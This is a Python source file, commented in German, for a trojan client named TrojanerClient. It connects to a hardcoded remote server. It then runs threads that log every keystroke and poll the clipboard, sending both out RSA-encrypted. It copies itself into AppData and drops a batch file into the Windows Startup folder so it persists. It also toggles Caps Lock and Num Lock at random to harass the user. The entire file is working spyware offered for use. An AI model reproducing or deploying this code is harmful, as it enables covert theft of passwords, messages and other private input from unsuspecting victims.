import socket
import os
import shutil
import pyperclip
import time
import pyautogui
import random
from threading import Thread
from pynput import keyboard
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization


class TrojanerClient():
    def __init__(self, server_ip="shadowbeeen.de", server_port=49155):
        # Variablen
        self.server_ip = socket.gethostbyname(server_ip)
        self.server_port = server_port
        self.client_socket = None
        self.public_key = None
        self.s, self.public_key = self.get_public_key()

        # Startet die Threads
        try:
            thread_keylogger = Thread(target=self.keylogger)
            thread_keylogger.start()

            thread_clipboard = Thread(target=self.clipboard)
            thread_clipboard.start()

            thread_auto_startup = Thread(target=self.auto_startup)
            thread_auto_startup.start()

            thread_annoy_user = Thread(target=self.annoy_user)
            thread_annoy_user.start()
            pass
        except:
            pass
    
    # Connectet zum Server
    def connect_to_server(self):
        while True:
            try:
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client_socket.connect((self.server_ip, self.server_port))
                print("Connected to server.")
                return self.client_socket
            except socket.error:
                print("Connection failed. Retrying in 5 seconds...")
                time.sleep(5)

    # RSA Verschlüsselung
    def get_public_key(self):
        s= self.connect_to_server()
        public_key_serialized = s.recv(524288)
        public_key = serialization.load_pem_public_key(public_key_serialized)
        return s, public_key
    
    # RSA Verschlüsselung
    def encrypt(self, message):
        return self.public_key.encrypt(
            message,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    
    # Clipboardlogger
    def clipboard(self):
        while True:
            try:
                time.sleep(5)
                copy = pyperclip.paste()
                encrypted_key = self.encrypt(bytes(f"Clipboard {copy}", "utf-8"))
                self.s.send(encrypted_key)
            except Exception as e:
                print(e)

    # Keylogger
    def keylogger(self):
        def on_press(key):
            try:
                # Handle special keys
                if key == keyboard.Key.enter:
                    key = '\n'
                elif key == keyboard.Key.backspace:
                    key = "Delete_Last"
                elif key == keyboard.Key.space:
                    key = ' '  # Spacebar
                else:
                    key = key.char  # Extract character

                print(f"Taste gedrückt: {key}")
                encrypted_key = self.encrypt(bytes(f"Keylogger {key}", "utf-8"))
                self.s.send(encrypted_key)

            except AttributeError:
                # Ignore other special keys
                pass
        while True:
            try:
                with keyboard.Listener(on_press=on_press) as listener:
                    listener.join()
            except (socket.error, KeyboardInterrupt):
                print("Disconnected. Reconnecting...")
                s.close()
                # Reconnect and get the public key again
                s, self.public_key = self.get_public_key()
        
    # Autostartup den Trojaner
    def auto_startup(self):
        source_files = os.listdir()
        target_dir = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming"
        if f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" == os.getcwd():
            print("allready in auto startup")
            return
        try:
            os.mkdir(f"{target_dir}\\python")
        except:
            print("Folde allready exists")
        target_dir = target_dir + "\\python"
        for file_name in source_files:
            shutil.move(os.path.join(os.path.join(os.getcwd()), file_name), target_dir)
        
        with open(f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\audio.bat', "w") as f:
            f.write(f'{target_dir}\\pythonw.exe "{target_dir}\\meine_scripts\\neuer versuch\\main.py"')

    # Nutzer Nerven
    def annoy_user(self):
        while True:
            try:
                print("starting")
                pyautogui.press("capslock")
                print("capslock yay")
                time.sleep(random.randint(5,15))
                pyautogui.press("numlock")
                time.sleep(random.randint(20,40))
                print("numlock yay")
            except:
                pass

if __name__ == "__main__":
    TrojanerClient()
